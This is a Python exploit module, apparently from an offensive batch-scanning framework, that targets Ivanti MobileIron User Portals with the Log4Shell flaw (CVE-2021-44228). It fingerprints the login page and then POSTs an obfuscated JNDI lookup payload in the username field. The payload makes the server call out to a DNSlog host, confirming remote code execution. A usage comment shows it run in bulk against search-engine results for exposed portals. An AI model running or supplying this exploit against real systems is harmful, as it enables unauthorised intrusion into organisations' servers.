# coding=utf-8
# @Author   : zpchcbd HG team
# @Blog     : https://www.cnblogs.com/zpchcbd/
# @Time     : 2021-12-07 20:32

from core.data import gLogger
from core.parser.urlparser import UrlParser
from core.utils.dnslog import get_eyes_identifier, eyes_dnslog_verify
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *


# python3 batch.py -m exploit.scripts.MobileIron.CVE-2021-44228 -cs -fs "app=\"MobileIron-User-Portal\""


class Script(BaseScript):
    name = 'MobileIron'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.RCE
        # 编号
        self.bug_number = 'CVE-2021-44228'
        # 来源
        self.bug_refer = 'https://github.com/projectdiscovery/nuclei-templates/blob/c8d2139e545775c34f5fb9e93d0da7a9d9aef0bd/vulnerabilities/mobileiron/mobileiron-log4j-jndi-rce.yaml'
        # 特定路径判断
        self.detect_path_list = ['/mifs/user/login.jsp']
        # exec
        self.exec_path_list = ['/mifs/j_spring_security_check']
        # priority
        self.priority = 1
        # 相关信息
        self.info = '''Ivanti MobileIron Apache Log4j2 <=2.14.1 JNDI in features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints.'''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if 'MobileIron' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        host = UrlParser(self.target).url_no_path
        headers = self.headers.copy()
        headers.update({'Referer': f'{host}/mifs/user/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded'})
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                verify_random_int = random.randint(10000, 99999)
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                data = 'j_username=$%7B$%7B::-j%7D$%7B::-n%7D$%7B::-d%7D$%7B::-i%7D:$%7B::-r%7D$%7B::-m%7D$%7B::-i%7D://{}.{}/a%7D&j_password=password&logincontext=employee'.format(verify_random_int, get_eyes_identifier())
                await AsyncFetcher.post_fetch(session=session, url=url, data=data, headers=headers, timeout=self.req_timeout)
                await asyncio.sleep(2)
                text = await eyes_dnslog_verify('dns', verify_random_int)
                if text is not None and text:
                    gLogger.myscan_info('[{} CVE-2021-44228 Verify:{}] {}'.format(self.name, verify_random_int, url))
                    return {'name': '{} CVE-2021-44228 Verify:{}'.format(self.name, verify_random_int), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass
